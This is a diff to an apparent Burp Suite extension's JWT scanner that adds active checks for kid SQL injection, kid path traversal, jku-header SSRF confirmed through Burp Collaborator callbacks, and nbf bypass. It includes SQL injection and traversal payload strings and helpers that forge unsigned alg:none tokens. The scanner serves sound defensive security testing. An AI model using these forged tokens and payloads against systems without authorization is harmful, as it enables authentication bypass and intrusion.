@@ -15,11 +15,16 @@ import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
+import burp.api.montoya.collaborator.CollaboratorClient;
+import burp.api.montoya.collaborator.CollaboratorPayload;
+import burp.api.montoya.collaborator.Interaction;
+import burp.api.montoya.collaborator.InteractionFilter;
 import burp.api.montoya.core.ByteArray;
 
 import java.nio.charset.StandardCharsets;
 import java.time.Instant;
 import java.util.*;
+import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -178,6 +183,128 @@ public class JwtPassiveScanCheck implements ScanCheck {
                 }
             }
 
+            // --- Attack 5: kid SQL injection ---
+            String[] kidSqlPayloads = {
+                    "' UNION SELECT 'secret' --",
+                    "' OR '1'='1",
+                    "\" OR \"1\"=\"1"
+            };
+            for (String payload : kidSqlPayloads) {
+                String kidSqlJwt = forgeWithKid(parts[0], parts[1], payload);
+                if (kidSqlJwt != null) {
+                    AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, kidSqlJwt,
+                            "JWT kid SQL Injection",
+                            "The server accepted a JWT with a SQL injection payload in the \"kid\" "
+                                    + "(Key ID) header field. This suggests the server uses the kid value "
+                                    + "in a SQL query to look up the signing key."
+                                    + "\n\nInjected kid: " + payload
+                                    + "\nForged JWT: " + kidSqlJwt.substring(0, Math.min(80, kidSqlJwt.length())) + "...",
+                            "Never use the kid claim in raw SQL queries. Use parameterized queries or "
+                                    + "a whitelist of allowed key IDs.",
+                            url, baseRequestResponse);
+                    if (issue != null) {
+                        issues.add(issue);
+                        api.logging().logToOutput("[JWT Scanner] CONFIRMED: kid SQLi accepted on " + url
+                                + " with payload: " + payload);
+                        break; // One confirmed finding is enough
+                    }
+                }
+            }
+
+            // --- Attack 6: kid path traversal ---
+            String[] kidPathPayloads = {
+                    "../../../dev/null",
+                    "../../../../../../../dev/null",
+                    "....//....//....//dev/null",
+                    "/dev/null"
+            };
+            for (String payload : kidPathPayloads) {
+                String kidPathJwt = forgeWithKid(parts[0], parts[1], payload);
+                if (kidPathJwt != null) {
+                    AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, kidPathJwt,
+                            "JWT kid Path Traversal",
+                            "The server accepted a JWT with a path traversal payload in the \"kid\" "
+                                    + "(Key ID) header field. This suggests the server uses the kid value "
+                                    + "as a file path to load the signing key. An attacker can point it to "
+                                    + "a known file (like /dev/null) and sign with an empty key."
+                                    + "\n\nInjected kid: " + payload
+                                    + "\nForged JWT: " + kidPathJwt.substring(0, Math.min(80, kidPathJwt.length())) + "...",
+                            "Never use the kid claim as a file path. Use a whitelist of allowed key IDs.",
+                            url, baseRequestResponse);
+                    if (issue != null) {
+                        issues.add(issue);
+                        api.logging().logToOutput("[JWT Scanner] CONFIRMED: kid path traversal on " + url
+                                + " with payload: " + payload);
+                        break;
+                    }
+                }
+            }
+
+            // --- Attack 7: jku header injection via Burp Collaborator ---
+            try {
+                CollaboratorClient collaborator = api.collaborator().createClient();
+                CollaboratorPayload collabPayload = collaborator.generatePayload();
+                String collabUrl = "https://" + collabPayload + "/.well-known/jwks.json";
+
+                String jkuJwt = forgeWithJku(parts[0], parts[1], collabUrl);
+                if (jkuJwt != null) {
+                    // Send the forged JWT — we don't care about the response status,
+                    // we care about whether the server made an outbound request to our Collaborator
+                    String tamperedValue = baseValue.replace(originalJwt, jkuJwt);
+                    api.http().sendRequest(
+                            insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(tamperedValue)));
+
+                    // Wait briefly for the Collaborator interaction
+                    Thread.sleep(3000);
+
+                    List<Interaction> interactions = collaborator.getInteractions(
+                            InteractionFilter.interactionPayloadFilter(collabPayload.toString()));
+
+                    if (!interactions.isEmpty()) {
+                        Interaction interaction = interactions.get(0);
+                        issues.add(AuditIssue.auditIssue(
+                                "JWT jku Header Injection (SSRF)",
+                                "The server fetched an external URL from the JWT's \"jku\" (JWK Set URL) "
+                                        + "header field. This is a Server-Side Request Forgery (SSRF) vulnerability "
+                                        + "that allows an attacker to make the server load signing keys from an "
+                                        + "attacker-controlled URL, enabling full JWT forgery."
+                                        + "\n\nInjected jku: " + collabUrl
+                                        + "\nCollaborator interaction: " + interaction.type()
+                                        + " from " + interaction.clientIp(),
+                                null, url,
+                                AuditIssueSeverity.HIGH,
+                                AuditIssueConfidence.CERTAIN,
+                                null,
+                                "Never trust the jku or x5u claims in JWT headers. Use a hardcoded or "
+                                        + "whitelisted JWKS URL server-side.",
+                                AuditIssueSeverity.HIGH,
+                                baseRequestResponse));
+
+                        api.logging().logToOutput("[JWT Scanner] CONFIRMED: jku SSRF on " + url);
+                    }
+                }
+            } catch (Exception e) {
+                api.logging().logToError("[JWT Scanner] Collaborator check skipped: " + e.getMessage());
+            }
+
+            // --- Attack 8: nbf (not before) bypass ---
+            String nbfJwt = forgeWithFutureNbf(parts[0], parts[1]);
+            if (nbfJwt != null) {
+                AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, nbfJwt,
+                        "JWT nbf (Not Before) Bypass",
+                        "The server accepted a JWT with the \"nbf\" (not before) claim set to a date "
+                                + "far in the future. This means the server does not validate the nbf claim, "
+                                + "allowing use of tokens before their intended activation time."
+                                + "\n\nOriginal: " + jwtPreview
+                                + "\nForged (nbf=future): " + nbfJwt.substring(0, Math.min(80, nbfJwt.length())) + "...",
+                        "Ensure the server validates the \"nbf\" claim and rejects tokens used before their activation time.",
+                        url, baseRequestResponse);
+                if (issue != null) {
+                    issues.add(issue);
+                    api.logging().logToOutput("[JWT Scanner] CONFIRMED: nbf bypass on " + url);
+                }
+            }
+
         } catch (Exception e) {
             api.logging().logToError("[JWT Scanner] Error during active audit: " + e.getMessage());
         }
@@ -273,6 +400,66 @@ public class JwtPassiveScanCheck implements ScanCheck {
             return forgedHeader + "." + forgedPayload + ".";
         } catch (Exception e) {
             api.logging().logToError("[JWT Scanner] Error forging no-exp JWT: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Forge a JWT with a custom kid (Key ID) value and alg:none.
+     */
+    private String forgeWithKid(String originalHeader, String originalPayload, String kidValue) {
+        try {
+            String headerJson = new String(base64UrlDecode(originalHeader), StandardCharsets.UTF_8);
+            JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
+            header.addProperty("kid", kidValue);
+            header.addProperty("alg", "none");
+            String forgedHeader = base64UrlEncode(header.toString().getBytes(StandardCharsets.UTF_8));
+            return forgedHeader + "." + originalPayload + ".";
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error forging kid JWT: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Forge a JWT with a jku (JWK Set URL) header pointing to an attacker-controlled URL.
+     */
+    private String forgeWithJku(String originalHeader, String originalPayload, String jkuUrl) {
+        try {
+            String headerJson = new String(base64UrlDecode(originalHeader), StandardCharsets.UTF_8);
+            JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
+            header.addProperty("jku", jkuUrl);
+            header.addProperty("alg", "none");
+            String forgedHeader = base64UrlEncode(header.toString().getBytes(StandardCharsets.UTF_8));
+            return forgedHeader + "." + originalPayload + ".";
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error forging jku JWT: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Forge a JWT with nbf (not before) set to 1 year in the future.
+     * Uses alg:none since we can't re-sign.
+     */
+    private String forgeWithFutureNbf(String originalHeader, String originalPayload) {
+        try {
+            String payloadJson = new String(base64UrlDecode(originalPayload), StandardCharsets.UTF_8);
+            JsonObject payload = JsonParser.parseString(payloadJson).getAsJsonObject();
+
+            // Set nbf to 1 year from now
+            long futureNbf = Instant.now().plusSeconds(365L * 24 * 60 * 60).getEpochSecond();
+            payload.addProperty("nbf", futureNbf);
+            String forgedPayload = base64UrlEncode(payload.toString().getBytes(StandardCharsets.UTF_8));
+
+            String headerJson = new String(base64UrlDecode(originalHeader), StandardCharsets.UTF_8);
+            JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
+            header.addProperty("alg", "none");
+            String forgedHeader = base64UrlEncode(header.toString().getBytes(StandardCharsets.UTF_8));
+
+            return forgedHeader + "." + forgedPayload + ".";
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error forging nbf JWT: " + e.getMessage());
             return null;
         }
     }
